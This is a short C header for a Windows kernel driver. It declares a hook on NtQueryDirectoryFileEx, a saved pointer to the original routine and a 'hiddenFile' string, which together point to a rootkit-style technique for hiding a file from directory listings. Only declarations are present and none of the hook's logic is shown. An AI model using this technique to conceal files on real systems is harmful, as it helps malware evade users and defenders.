#ifndef __QUERYDIR_H
#define __QUERYDIR_H

#include <wdm.h>

typedef NTSTATUS (NTAPI *NtQueryDirectoryFileEx_t)(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG QueryFlags,  // Valid flags are in SL_QUERY_DIRECTORY_MASK
	PUNICODE_STRING FileName
);

NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG QueryFlags,  // Valid flags are in SL_QUERY_DIRECTORY_MASK
	PUNICODE_STRING FileName
);

extern NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;
extern UNICODE_STRING hiddenFile;

#endif //__QUERYDIR_H